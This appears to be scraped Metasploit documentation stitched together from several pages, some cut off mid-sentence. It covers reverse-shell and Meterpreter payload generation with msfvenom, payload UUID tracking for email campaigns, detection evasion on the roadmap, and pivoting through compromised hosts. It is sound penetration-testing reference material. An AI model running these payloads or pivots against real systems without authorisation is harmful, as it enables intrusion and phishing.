This normally involves the creation of a Metasploit session, but may instead execute code such as adding user accounts, or executing a simple pingback command that verifies that code execution was successful against a vulnerable target. Payload modules can also be used individually to generate standalone executables, or shellcode for use within exploits: . msf payload(linux/x86/shell_reverse_tcp) &gt; back msf &gt; use payload/linux/x86/shell_reverse_tcp msf payload(linux/x86/shell_reverse_tcp) &gt; set lhost 127.0.0.1 lhost =&gt; 127.0.0.1 msf payload(linux/x86/shell_reverse_tcp) &gt; set lport 4444 lport =&gt; 4444 # Generate a payload for use within C msf payload(linux/x86/shell_reverse_tcp) &gt; generate -f c # Generate an ELF file for execution on Linux environments msf payload(linux/x86/shell_reverse_tcp) &gt; generate -f elf -o linux_shell . Post modules (429) . These modules are useful after a machine has been compromised and a Metasploit session has been opened.

    "content": "Meterpreter Transport and Scalability Overhaul . The Meterpreter Protocol “TLV” is enhanced to support modern features such as logging, unidirectional messages, obfuscation, sequence number reassembly and more. This feature will enable Meterpreter sessions to be more robust, faster, and evade detection with greater ease than before. Additionally, Meterpreter payload listeners, rather than being integrated straight into msfconsole, will run as an independent process that communicates with msfconsole (1 or more users) over RPC similar to the msfdb_ws (Metasploit Database Web Service). The external listener then replaces the ‘metasploit-aggregator’ project by not requiring an intermediate proxy to park or share sessions, these are done directly by having the listeners independent of console users. Listener capabilities be embeddable directly into Meterpreter payloads, allowing local listeners and remote listeners internal to other networks could be implemented the same way, enabling greater scalability and facilitating pivoting across more complex networks, allowing better post-exploitation possibilities in modern network environments. Integration with external C2 frameworks . If listeners are externalized, then there is an API layer both for interactive interaction with remote sessions, and a way for the Post-exploitation API to communicate with the external sessions. That should mean that if an external C2 framework supports at minimum shell interaction, a bulk of the Post-exploitation API should be applicable against external C2 frameworks as well. Metasploit would then be able to integrate both with other open-source C2 frameworks, as well as private ones. Integration of native tool-chains . Tools like Veil, pwnlib, etc. have for a long time used native compilers and tooling to build payloads and evasions. Metasploit has opted mostly for native Ruby solutions, though it does have some implicit runtime dependencies like apktool for Android payload injection. However, these tools are getting harder to maintain and use (e.g. metasm has a difficult time building any non-trivial C code, we just spent a month fixing a bug it had with Ruby 2.5 and Windows). It would be nice to have either be able to depend on a set of first-class toolchains being available in the environment, or have some way to package them natively with Metasploit itself. A full suite of compilers and tools does consume considerable amounts of space (e.g. mettle’s toolchain is 1.8GB uncompressed), but this is probably less of a problem than it was 15 years ago. Native first-class UUID-aware, async stager payload . Make a new async payload type (based on pingback payload work) making secure comms, endpoint verification, and async communication first-class citizens, and on by default. These session types would support a much more limited set of actions than Meterpreter, only supporting sleep/upload/download/stage, but would be upgraded to Meterpreter directly as-needed (maybe even transparently). Network protocols can be much more exotic for this, and the listener/payload should be usable externally from Metasploit as well. Todo: pull in async payload proposal notes from @bwatters-r7. ",

    "content": "Overhaul network targeting . Setting at least 5 variables RHOSTS/RPORT/SSL/VHOST/SSL_Version/User/Pass/etc… to target a single web application is very cumbersome. When these variables also do not apply to multiple RHOSTS exactly, the scheme of multiple variables falls apart further. Metasploit should be able to target URLs directly, that can all have their own independent ports, users, hostnames, etc: . set TARGETS https://user:password@target_app:4343 https://target_app2 . Overhaul credential targeting . The credential datastore options also has many different co-dependent and independent variables, which are confusing and awkward to use. In addition, there is little in the way of user-parallelism for using login scanners against single-service web apps. MSF6 should have an easier less messy overhaul of targeting multiple users and apps as well. Maybe TARGETS could be used the same way? . Collapse module types, expose module ‘abilities’ or ‘methods’ instead . Modules in Metasploit are classified according to what they can do (‘exploits can exploit, scanners can scan’) but often its useful to be able to scan for exploitable targets. Workarounds include reaching between modules and sharing library code and mixins. This proposal suggests that ‘exploit’ and ‘scanner’, as well as many other aux-type modules should collapse into a single module type. They simply expose capabilities like ‘scan’, ‘check’, ‘exploit’, etc. and a single module can do all of these. Additionally, ‘admin’ modules could be collapsed. For instance, why have a chromecast_reset and chromecast_youtube module when you can use ‘admin/chromecast’ and just type ‘cast’ or ‘reset’ as methods on this single module. This would also replace the ‘ACTIONS’ datastore option where they are used in multi-action aux modules. Integration with external exploitation frameworks . E.g. could we just use routersploit or wpsploit directly from within framework and gather loot/run post exploitation, etc. through them? Maybe using the external module RPC, just being able to expose multiple modules behind the same API? . Changing module structure on disk . Currently a non-trivial exploit module will require adding code to 4 different subdirectories (lib, modules, documentation, external) which makes it both hard to follow all of the moving pieces, but also makes it harder to extract modules for independent use. See Bundled Modules Proposal for a more detailed proposal. ",

    "title": "Data Model",
    "content": "Temporal / log-oriented data model . Metasploit implements a standard Ruby-on-Rails CRUD model for storing data about an environment. A Host object is created, updated, deleted, etc. But, anything can update anything, making it easy to lose data, and hard to notice changes over time. A workaround is religious use of workspaces to segregate observations, but that’s more of a workaround. A log-structured data model (observations about hosts/loot/credentials/services, etc.) should just be objects that are imported into a datastore that prioritizes search over everything else. Relationships between objects should be loose and maleable, as the way the graph of how objects are related can and does change over time in modern environments, often on the order of hours or minutes. As a concrete example, say every report_* method just wrote a JSON blob into elasticsearch. Then you would have first observed data, and when something else happens, say a password is cracked, rather than modifying a credential object, there would just be an enrichment object added to the data store, and both could be matched together later. The current data model also often doesn’t have ways of storing arbitrary information from modules that need it; loot is often used as a workaround, but it’s not searchable by content. Providing a way to store arbitrary JSON from modules would allow the flexibility to store anything, search for anything, and to never lose anything. Also, services would be removable as well from the database when a service is down. Note: a temporal data model will likely need something better able to show data relations than the current tabular rex-table approach in msfconsole. Web UI? . Data model is always available . The database in Metasploit has historically been optional. Not everyone needs to store data and setting up and maintaining the database is often a burden to the user, with many possible failure modes. Having the data model not always be available often complicates Metasploit’s code, and made some features like UUID tracking for payloads difficult to implement reliably. Metasploit 5 added web services for the data mode, which further complicated the code paths, adding a third way for behavior to possibly differ. We should make a light-weight in-memory database service that can run automatically if a persistent database is unavailable or unconfigured, which can always provide some sort of database service to Metasploit, even if it is ephemeral and exits when msfconsole/listeners, etc. have exited. framework.db should always exist, even if the data it stores goes into a temporary bit bucket. Then all of the conditional code paths can go away. ",

We have some prototypes of the database web service rewritten in golang, and a persistent payload generation service that can be used my a client-only msfvenom-like tool can speed up execution considerably. Sunsetting, separation of old module / code . Metasploit has some really old modules that probably don’t get used very often. Can we segregate these or sunset them so that the overall number of modules is reduced? . Integration of separate Metasploit projects into fewer repos (rex / payloads / metasploit data models) .

If your working on something that could affect multiple modules, that code will likely be contained in a library stored under this directory. | modules - All modules are stored under this directory, and are further broken down into several categories. | modules/exploit - Stores exploit modules which generally tend to gain you a shell of some sort. | modules/auxiliary - Stores auxiliary modules, which are used to gain information and generally don’t gain a shell. | modules/post - Stores post modules which perform useful actions after one has gained access to a target. | modules/encoders - Stores encoder modules which are used to encode various payloads to help avoid bad characters or provide additional obfuscation. | modules/evasion - Stores evasion modules which are used to help avoid antivirus. | modules/nops - Stores NOP modules used for generating NOP shellcode for various architectures. | plugins - Used for storing various Metasploit plugins that allow Metasploit to integrate with other programs or import data from other programs. | scripts - Stores various scripts used within Metasploit, such as Meterpreter, and scripts for the console interface of Metasploit Framework. | spec - Contains various RSpec checks that are used to ensure libraries and core functionality within the framework are working as expected. If you are writing a new library or adjusting one, you may need to update the corresponding RSpec file within this directory to ensure the specification checks are updated to reflect the new behavior. | test - Contains tests for various parts of Metasploit code to ensure they are operating as expected. | tools - Contains various tools that may be helpful under different situations. The dev directory contains tools useful during development, such as tools/dev/msftidy_docs.rb which helps ensure your documentation is in line with standards.~~ | . ",

    "content": "You can search through the code of Metasploit using GitHub with searches such as https://github.com/rapid7/metasploit-framework/search?l=Ruby&amp;q=%22payload.arch%22&amp;type=code. Note that double quotes are required to match specifically on a certain term; in the previous example this term was payload.arch. You can also set the type=code parameter to specifically match only on code results, however this can be set to commits or issues if you want to search commits or issues instead. Finally notice that when searching code, its important to also specify the language of the files you want to match. In the case above I made it so that my results would only match on files deemed by GitHub to contain Ruby code, however you can also specify other languages such as Batch, or C if you want those languages instead. You can even remove the language restriction if you find your search results are too narrow. Another incredibly useful feature of GitHub is the ability to search across all repositories that an organization owns. This is especially useful in Metasploit as certain components, such as Rex code and payload code, may be contained in repositories other than metasploit-framework. To search across the public repositories that Rapid7 owns, use a search such as https://github.com/search?q=org%3Arapid7+%22payload.arch%22&amp;type=code. Note the presence of the org:rapid7 tag within the previous URL: this tells GitHub to look through all repositories that Rapid7 owns for the term payload.arch within any code files. Experiment with these results and play around with GitHub searches more. Over time you will learn where it is useful and where it has its limitations and will be able to determine when it might be better to use an IDE to help understand a piece of code more. ",

RubyMine also offers autocompletion and integrates well with many tools such as Git to allow you to quickly switch branches and RuboCop to help provide suggestions on where your code style could be improved. For a cheaper option one can also use VS Code. Note however that VS Code does not have the best autotab completion and will not allow you to trace references, however if your willing to put up with this, it is a much faster and more lightweight product than RubyMine, which makes it great for those times when you just need to edit a piece of code without loading a bunch of related files that you don’t need to reference or edit. It also has great regex search features that work much faster than RubyMine, allowing you to search for items within the codebase a lot quicker than you can with RubyMine, which will often seem to stutter at times due to its larger overhead.

This tool provides a lot of the autocomplete and IntelliSense functionality you might get from dedicated IDEs such as RubyMine, within VSCode itself. The tool can be installed by running gem install solargraph-rails for the Rails integrations, which will also in turn install solargraph itself. If you just want SolarGraph without the Rails integrations, run gem install solargraph. The configuration file for SolarGraph itself can be found at .solargraph.yml within the root directory of Metasploit Framework. For more information on how this works and how to tweak it, please refer to https://solargraph.org/guides/configuration. Once the Gem files have been installed, the next step is to install the VSCode plugin. You can grab it from https://marketplace.visualstudio.com/items?itemName=castwide.solargraph. Once this is done, run the following commands to ensure that SolarGraph is using the most up to date information about your code: . bundle install # Update all the gems yard gems # Create documentation files for all the gems. SolarGraph relies on YARD for a lot of info. yard doc -c # Create YARD docs for all files and use the cache so we don't repeat work (-c option). solargraph bundle # Update Solargraph documentation for bundled gems . Then close down VSCode and restart it again, opening up the metasploit-framework directory again as a project if needs be. This should result in the SolarGraph server starting and then taking a few minutes to index your files. Note that this process may occur every time you open up the metasploit-framework project. This is normal and to be expected. If you’d like to save yourself some time, you can have YARD automatically generate new documentation for installed Gems by running yard config --gem-install-yri which will configure YARD to automatically generate documentation whenever new Gems are installed.

You can enter into an interactive debugging environment using pry by adding the following code snippet within your Metasploit module or library method: . require 'pry'; binding.pry . Pry includes inbuilt commands for code navigation: . | backtrace: Show the current call stack | up / down: Navigate the call stack | step: Move forward by a single execution step | next: Move forward by a single line | whereami: Show the current breakpoint location again | help: View all of the available commands and options | . Ruby’s runtime introspection can be used to view the available methods, classes, and variables within the current Ruby environment: . | self: To find out what the current object is | self.methods: Find all available methods | self.methods.grep /send/: Searching for a particular method that you’re interested in. This can be great to explore unknown APIs. | self.method(:connect).source_location: Find out which file, and which line, defined a particular method | self.class.ancestors: For complex modules, this can be useful to see what mixins a Metasploit module is currently using | .

It replaces the old lib/debug.rb library that was not actively being maintained and replaces it with a modern debugging library capable of performing many debugging actions with next to no impact on the performance of the debugged application. Whilst RubyMine does not support the debug.gem functionality, you can use VSCode to take advantage of debug.gem to get speedy debugging of Ruby scripts from within VSCode itself. Simply install the debugging plugin from https://marketplace.visualstudio.com/items?itemName=KoichiSasada.vscode-rdbg, then go to the Metasploit root directory, and if you have Bundler installed, run bundle install. This will bring in the latest version of the debug gem. Once this is all done, open the metasploit-framework folder from a cloned GitHub copy of Metasploit Framework in VSCode by using File-&gt;Open Folder. Then click Run-&gt;Add Configuration-&gt;Ruby(rdbg). This will create a file at &lt;metasploit root&gt;/.vscode/launch.json. Replace the contents of this file with the contents of the file at https://github.com/rapid7/metasploit-framework/blob/master/external/vscode/launch.json. If you wish, you can optionally change the listening port from 55634 in the script to one of your choice. Finally click Run-&gt;Start Debugging to start debugging Metasploit Framework using VSCode. This may cause a prompt to appear that looks like bundle exec ruby /home/tekwizz123/git/metasploit-framework/msfconsole. Confirm this looks okay and that you are using bundle exec ruby to execute msfconsole. If all looks good, hit the ENTER key to confirm. At this point you should see Metasploit Framework open up. If you want to prevent this prompt in the future then simply remove the \"askParameters\": true, line from launch.json. Once in a debugging session, debug.gem supports the same commands as Pry in may cases, so the commands listed in the Pry section above should work in the same manner. Additionally debug.gem also supports extra commands for things such as tracing data.

The Authentication server (AS) performs the client authentication process. Authentication is generally performed using a secret key such as the user’s password - but other methods such exist such as pkinit which relies on public keys for authentication. If authentication is successful, the authentication server will return a new Ticket Granting Ticket (TGT). The Ticket Granting Server requires a user’s TGT, and the service details that the user would like to gain access to. These Service Tickets used are for gaining access to services such as SMB/WinRM/etc. In most Kerberos pentesting tools, including Metasploit, the granted Service Tickets are called TGS. Service Principal Name . A (SPN) is a forest unique string. It associates a service to a service logon account. The SPN is set on a user computer object via the AD Schema. Generally the SPN follows the format &lt;service class&gt;/&lt;host&gt;&lt;realm&gt;:&lt;port&gt;/&lt;service name&gt;. A service can have multiple SPNs. On a Window’s Domain Controller you can view the available SPNs with the setspn -q */* command. Security identifiers . In the context of Microsoft’s Active Directory - Security identifiers (SID) are used to uniquely identify users, groups, and computer accounts.

    "doc": "Payload UUID",
    "title": "Payload UUID",
    "content": "In mid-2015, a new feature was added to many HTTP and TCP Metasploit payloads: Payload UUIDs. A Payload UUID is a 16-byte value that encodes an 8-byte identifier, a 1-byte architecture ID, a 1-byte platform ID, a 4-byte timestamp, and two additional bytes for obfuscation. The source code comments go into more detail. In the case of HTTP payloads, the 16-byte UUID value is encoded in base64url format resulting in a 22-byte string. This value is always placed in the beginning of the URL used by the payload. TCP payloads send the 16-byte raw value over the socket once a connection is established. The goal of Payload UUIDs is three-fold: . | Uniquely identify a generated payload. This is important when running social engineering campaigns to identify what specific payload a target executed. If an email campaign resulted in one user forwarding a payload to another user before it was executed, this can be determined by reviewing the UUID in the session listing. | Drop connections that do not match known UUIDs. This allows a listener to be setup that only allows known sessions to connect, which is important when running internet-facing payload handlers. | Enable universal handlers. The embedded platform and architecture identifiers allow the listener to determine what type of stage to send back to a stager. This will eventually allow for a single listener to be used with multiple exploits, even those that target different platforms and architectures. | . Specifying the UUID . Although Payload UUIDs are normally random, it is possible to specify a static UUID value using the PayloadUUIDRaw option. This option takes a 8-byte hex string, such as “0011223344556677”. For example: . $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDRaw=4444444444444444 -f exe -o payload.exe . Instead of specifying a static UUID as the raw 8-byte value, it is also possible to derive a static UUID using an arbitrary-length string using the PayloadUUIDSeed option: . $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDSeed=ShellsAreDelicious -f exe -o payload.exe . Tracking the UUID . Payload UUIDs are enabled by default, but are not tracked unless the PayloadUUIDTracking option is set to true. Setting this option causes a new entry to be created in ~/.msf4/payloads.json when any UUID-enabled payload is generated. It is also possible to create a local-only name for a given UUID using the PayloadUUIDName. The example below will create a new registered payload with a custom name: . $ ./msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=4444 PayloadUUIDTracking=true PayloadUUIDName=EmailCampaign20150101 -f exe -o payload.exe $ cat ~/.msf4/payloads.json { \"68017d72958c40f6\": { \"arch\": \"x86\", \"platform\": \"windows\", \"timestamp\": 1435277049, \"payload\": \"payload/windows/meterpreter/reverse_https\", \"datastore\": {\"AutoLoadStdapi\":true,\"AutoRunScript\":\"\",\"AutoSystemInfo\":true,\"AutoVerifySession\":true,\"AutoVerifySessionTimeout\":30,\"EXITFUNC\":\"process\",\"EnableStageEncoding\":false,\"EnableUnicodeEncoding\":false,\"HttpUnknownRequestResponse\":\"\\u003Chtml\\u003E\\u003Cbody\\u003E\\u003Ch1\\u003EIt works!\\u003C/h1\\u003E\\u003C/body\\u003E\\u003C/html\\u003E\",\"IgnoreUnknownPayloads\":false,\"InitialAutoRunScript\":\"\",\"LHOST\":\"127.1.1.1\",\"LPORT\":4444,\"MeterpreterServerName\":\"Apache\",\"MeterpreterUserAgent\":\"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\",\"OverrideRequestHost\":false,\"PAYLOADUUIDNAME\":\"EmailCampaign20150101\",\"PayloadProxyPort\":0,\"PayloadProxyType\":\"HTTP\",\"PayloadUUIDTracking\":true,\"PrependMigrate\":false,\"ReverseListenerBindPort\":0,\"SessionCommunicationTimeout\":300,\"SessionExpirationTimeout\":604800,\"SessionRetryTotal\":3600,\"SessionRetryWait\":10,\"StageEncoderSaveRegisters\":\"\",\"StageEncodingFallback\":true,\"StagerRetryCount\":10,\"StagerURILength\":0,\"StagerVerifySSLCert\":false,\"VERBOSE\":false}, \"name\": \"EmailCampaign20150101\", \"urls\": [ \"/aAF9cpWMQPb-3f_cq1FoJA040uMw26kAnvroJdztpVzDrNpqbpT7t3DyYy0cR2TyQE87XxHgIOKiYwP2FJNlNjrBXWQNiGWtzUK1ueJ0DyFjCXmULVo_gGrvi\" ] } } . Once this payload is launched, the output of the sessions -l -v command will show the UUID, whether or not the UUID is registered, and any locally-assigned name of the UUID: . msf exploit(handler) &gt; run -j [*] 127.0.0.1:36235 (UUID: 68017d72958c40f6/x86=1/windows=1/2015-06-26T00:04:09Z) Staging Native payload ...

Whitelisting UUIDs . The ~/.msf4/payloads.json file can also be used as a whitelist. This makes it possible to run a listener on a common port on a public IP address without the Metasploit Framework instance being flooded with bogus sessions. To enable whitelisting for HTTP payloads, set the IgnoreUnknownPayloads option to true in the handler instance. Any incoming request that does match both a registered Payload UUID and one of the pre-generated URLs will be ignored. The payloads.json file can be copied between Metasploit Framework instances and even hand-edited while the framework is running. ",

    "content": "Whilst in test environments one is often looking at flat networks that only have one subnet and one network environment, the reality is that when it comes to pentests that are attempting to compromise an entire company, you will often have to deal with multiple networks, often with switches or firewalls in-between that are intended to keep these networks separate from one another. In order for pivoting to work, you must have compromised a host that is connected to two or more networks. This usually means that the host has two or more network adapters, whether that be physical network adapters, virtual network adapters, or a combination of both. Once you have compromised a host that has multiple network adapters you can then use the session that you have obtained on that host to use that host as a pivot, and relay traffic through the compromised host to the target machine that you want to access. This allows you, as an attacker, to access machines on networks that you might not otherwise have access to, by utilizing the access to internal networks that the compromised machine has. Now that we understand some of the background, lets see this in action a bit more by setting up a sample environment and walking through some of Metasploit’s pivoting features. ",

Note: This method is discouraged as you can only set up a mapping between a single port and another target host and port, so using the socks module below is encouraged where possible. Additionally this method has been depreciated for some time now. Local Port Forwarding . To set up a port forward using Metasploit, use the portfwd command within a supported session’s console such as the Meterpreter console. Using portfwd -h will bring up a help menu similar to the following: . meterpreter &gt; portfwd -h Usage: portfwd [-h] [add | delete | list | flush] [args] OPTIONS: -h Help banner. -i Index of the port forward entry to interact with (see the \"list\" command). -l Forward: local port to listen on.

Reverse: remote port to listen on. -r Forward: remote host to connect to. -R Indicates a reverse port forward. meterpreter &gt; . To add a port forward, use portfwd add and specify the -l, -p and -r options at a minimum to specify the local port to listen on, the report port to connect to, and the target host to connect to respectively. meterpreter &gt; portfwd add -l 1090 -p 443 -r 169.254.37.128 [*] Local TCP relay created: :1090 &lt;-&gt; 169.254.37.128:443 meterpreter &gt; . Note that something that is commonly misunderstood here is that the port will be opened on the machine running Metasploit itself, NOT on the target that the session is running on. We can then connect to the target host using the local port on the machine running Metasploit: . ~/git/metasploit-framework │ master ?21 wget --no-check-certificate https://127.0.0.1:1090 --2022-04-08 14:36:23-- https://127.0.0.1:1090/ Connecting to 127.0.0.1:1090... connected.

Note that you may need to edit your /etc/hosts file to map IP addresses to given host names to allow things like redirects to redirect to the right hostname or IP address when using this method of pivoting. Listing Port Forwards and Removing Entries . Can list port forwards using the portfwd list command. To delete all port forwards use portfwd flush. Alternatively to selectively delete local port forwarding entries, use portfwd delete -l &lt;local port&gt;. meterpreter &gt; portfwd delete -l 1090 [*] Successfully stopped TCP relay on 0.0.0.0:1090 meterpreter &gt; portfwd list No port forwards are currently active. meterpreter &gt; . Remote Port Forwarding . This scenario is a bit different than above. Whereas previously we were instructing the session to forward traffic from our host running Metasploit, through the session, and to a second target host, with reverse port forwarding the scenario is a bit different. In this case we are instructing the session to forward traffic from other hosts through the session, and to our host running Metasploit. This is useful for allowing other applications running within a target network to interact with local applications on the machine running Metasploit. To set up a reverse port forward, use portfwd add -R within a supported session and then specify the -l, -L and -p options. The -l option specifies the port to forward the traffic to, the -L option specifies the IP address to forward the traffic to, and the -p option specifies the port to listen on for traffic on the machine that we have a session on (whose session console we are currently interacting with). For example to listen on port 9093 on a target session and have it forward all traffic to the Metasploit machine at 172.20.97.72 on port 9093 we could execute portfwd add -R -l 4444 -L 172.20.97.73 -p 9093 as shown below, which would then cause the machine who have a session on to start listening on port 9093 for incoming connections. meterpreter &gt; portfwd add -R -l 4444 -L 172.20.97.73 -p 9093 [*] Local TCP relay created: 172.20.97.73:4444 &lt;-&gt; :9093 meterpreter &gt; netstat -a Connection list =============== Proto Local addre Remote addr State User Inode PID/Program name ss ess ----- ----------- ----------- ----- ---- ----- ---------------- tcp 0.0.0.0:135 0.0.0.0:* LISTEN 0 0 488/svchost.exe tcp 0.0.0.0:445 0.0.0.0:* LISTEN 0 0 4/System tcp 0.0.0.0:504 0.0.0.0:* LISTEN 0 0 5780/svchost.exe 0 tcp 0.0.0.0:909 0.0.0.0:* LISTEN 0 0 2116/bind_tcp_x64_4444.exe 3 .

    "title": "Socks Module",
    "content": "Once routes are established, Metasploit modules can access the IP range specified in the routes. For other applications to access the routes, a little bit more setup is necessary. One way to solve this involves using the auxiliary/server/socks_proxy Metasploit module to set up a socks4a proxy, and then using proxychains-ng to direct external applications towards the established socks4a proxy server that Metasploit has set up so that external applications can use Metasploit’s internal routing table. Socks Server Module Setup . Metasploit can launch a SOCKS proxy server using the module: auxiliary/server/socks_proxy. When set up to bind to a local loopback adapter, applications can be directed to use the proxy to route TCP/IP traffic through Metasploit’s routing tables. Here is an example of how this module might be used: . msf &gt; use auxiliary/server/socks_proxy msf auxiliary(server/socks_proxy) &gt; show options Module options (auxiliary/server/socks_proxy): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no Proxy password for SOCKS5 listener SRVHOST 0.0.0.0 yes The local host or network interface to listen on.

First, make sure that you have installed proxychains-ng. You can also use proxychains however most repositories such as Ubuntu will have an outdated version of it and it has crashed before in my tests, so it is highly recommended to use proxychains-ng instead which is actively maintained. You can install it with the following commands: . git clone https://github.com/rofl0r/proxychains-ng cd proxychains-ng make sudo make install . Now edit the proxychains configuration file located at /etc/proxychains.conf. Add the below line to the end of the file to set proxychains-ng to use the SOCKS 5 server that you just set up. Note that you may need to use sudo to edit this file due to the default permissions on this file preventing anyone but root from writing to it. socks5 127.0.0.1 1080 . The final final should look something like this: . # proxychains.conf VER 3.1 # # HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS. # # The option below identifies how the ProxyList is treated. # only one option should be uncommented at time, # otherwise the last appearing option will be accepted # #dynamic_chain # # Dynamic - Each connection will be done via chained proxies # all proxies chained in the order as they appear in the list # at least one proxy must be online to play in chain # (dead proxies are skipped) # otherwise EINTR is returned to the app # strict_chain # # Strict - Each connection will be done via chained proxies # all proxies chained in the order as they appear in the list # all proxies must be online to play in chain # otherwise EINTR is returned to the app # #random_chain # # Random - Each connection will be done via random proxy # (or proxy chain, see chain_len) from the list. # this option is good to test your IDS :) # Make sense only if random_chain #chain_len = 2 # Quiet mode (no output from library) #quiet_mode # Proxy DNS requests - no leak for DNS data proxy_dns # Some timeouts in milliseconds tcp_read_time_out 15000 tcp_connect_time_out 8000 # ProxyList format # type host port [user pass] # (values separated by 'tab' or 'blank') # # # Examples: # # socks5 192.168.67.78 1080 lamer secret # http 192.168.89.3 8080 justu hidden # socks4 192.168.1.49 1080 # http 192.168.39.93 8080 # # # proxy types: http, socks4, socks5 # ( auth types supported: \"basic\"-http \"user/pass\"-socks ) # [ProxyList] # add proxy here ... # meanwile # defaults set to \"tor\" socks5 127.0.0.1 1080 . Note: If there are other proxy entries in the configuration file, you may need to comment them out as they may interfere with proper routing. Using Proxychains-NG . Now you can combine proxychains-ng with other application like Nmap, Nessus, Firefox and more to scan or access machines and resources through the Metasploit routes. All you need to do is call proxychains-ng before the needed application. No need to change the proxy settings in the respective application. ~/git/metasploit-framework │ master ?21 wget https://169.254.37.128 --2022-04-08 13:52:23-- https://169.254.37.128/ Connecting to 169.254.37.128:443... failed: No route to host. ~/git/proxychains-ng │ master ?1 proxychains4 wget https://169.254.37.128 [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/local/lib/libproxychains4.so [proxychains] DLL init: proxychains-ng 4.16-git-1-g07c15a0 --2022-04-08 14:06:52-- https://169.254.37.128/ Connecting to 169.254.37.128:443...

Scanning . For scanning with Nmap, Zenmap, Nessus and others, keep in mind that ICMP and UPD traffic cannot tunnel through the proxy. So you cannot perform ping or UDP scans. For Nmap and Zenmap, the below example shows the commands can be used. It is best to be selective on ports to scan since scanning through the proxy tunnel can be slow. $ sudo proxychains4 nmap -n -sT -sV -PN -p 445 10.10.125.0/24 .

While Railgun gives coders the ability to execute arbitrary Win32 API calls, it doesn’t really give them the ability to script the client in a single-shot. Meterpreter now has a new extension that aims to solve this problem by providing a completely in-memory Python interpreter that can load scripts, run ad-hoc python commands, and also provides bindings to Meterpreter itself. The extension comes with many (but not all) of the built-in functionality you would expect to see in a running Python interpreter. This includes the likes of ctypes for easy automation of Win32-related functions. We’ve even taken steps to make this extension piggy-back onto metsrv’s copy of the SSL libraries in an effort to reduce the size of the resulting binary. This page aims to document the features, show examples of how it can be used, and answer a few common questions that come up. Unfortunately, at this point in time the extension only works inside x86 and x64 Meterpreters running on Windows targets. However, there are plans to enable this functionality on other implementations over time. ",

    "title": "python_execute",
    "content": "The python_execute command is the simplest of all commands that come with the extension, and provides the means to run single-shot lines of Python code, much in the same way that the normal Python interpreter functions from the command-line when using the -c switch. The full help for the command is as follows: . meterpreter &gt; python_execute -h Usage: python_execute &lt;python code&gt; [-r result var name] Runs the given python string on the target. If a result is required, it should be stored in a python variable, and that variable should passed using the -r parameter. OPTIONS: -h Help banner -r &lt;opt&gt; Name of the variable containing the result (optional) . A very simple example of this command is shown below: . meterpreter &gt; python_execute \"print 'Hi, from Meterpreter!'\" [+] Content written to stdout: Hi, from Meterpreter! . Notice that any output that is written to stdout is captured by Meterpreter and returned to Metasploit so that it’s visible to the user. This also happens for anything written to stderr, as shown below: . meterpreter &gt; python_execute \"x = x + 1\" [-] Content written to stderr: Traceback (most recent call last): File \"&lt;string&gt;\", line 1, in &lt;module&gt; NameError: name 'x' is not defined . This handy feature now only allows users to see the output of their scripts, but it also means that any errors are completely visible too. A more interesting example can be seen below: . meterpreter &gt; python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" [+] Command executed without returning a result . The command above executes, but nothing was printed to stdout, or to stderr, and hence nothing was captured. The good thing is that the Python extension is persistent across calls. This means that after the above command is executed, x is still present in the interpreter and can be accessed with another call: . meterpreter &gt; python_execute \"print x\" [+] Content written to stdout: [0, 5, 10, 15] . As useful as this is, developers may want to produce post-modules that make use of the data that a Python script has generated. Parsing stdout is not ideal in such a scenario, and hence this command provides the means for individual variables to be extracted directly using the -r parameter, as described by the help: . meterpreter &gt; python_execute \"x = [y for y in range(0, 20) if y % 5 == 0]\" -r x [+] x = [0, 5, 10, 15] . Note that this command requires the first parameter to be a string that contains code that needs to be executed. However, this string can be blank, resulting in no code being executed. This means that extraction of content generated in previous calls is still possible without executing more code, or rerunning previous code snippets just to make use of the -r parameter: . meterpreter &gt; python_execute \"\" -r x [+] x = [0, 5, 10, 15] . Behind the scenes, the result of the execution is a Ruby hash that contains all content written to stdout and stderr, and the content of the variable chosen using the -r parameter. Sometimes, single-line execution isn’t enough, or is cumbersome. The python_import command is provided to solve this problem and allow for scripts and modules to be loaded into the target from disk.

The full help is shown below: . meterpreter &gt; python_import -h Usage: python_import &lt;-f file path&gt; [-n mod name] [-r result var name] Loads a python code file or module from disk into memory on the target. The module loader requires a path to a folder that contains the module, and the folder name will be used as the module name. Only .py files will work with modules. OPTIONS: -f &lt;opt&gt; Path to the file (.py, .pyc), or module directory to import -h Help banner -n &lt;opt&gt; Name of the module (optional, for single files only) -r &lt;opt&gt; Name of the variable containing the result (optional, single files only) . Importing of module trees is still considered a beta feature, but we encourage you to use it where possible and keep us informed of any issues you may face. Consider the following script: . # $ cat /tmp/drives.py import string from ctypes import windll def get_drives(): drives = [] bitmask = windll.kernel32.GetLogicalDrives() for letter in string.uppercase: if bitmask &amp; 1: drives.append(letter) bitmask &gt;&gt;= 1 return drives result = get_drives() print result . The aim of this is to determine all the local logical drives and put the letters into a list. From there it prints that list to screen. The result of running the script is as follows: . meterpreter &gt; python_import -f /tmp/drives.py [*] Importing /tmp/drives.py ... [+] Content written to stdout: ['A', 'C', 'D', 'Z'] . This shows that ctypes does indeed function correctly! . This command is also intended to allow for recursive loading of modules from the local attacker file system, however this feature is still not yet ready for prime time and work is still actively being done on this area.

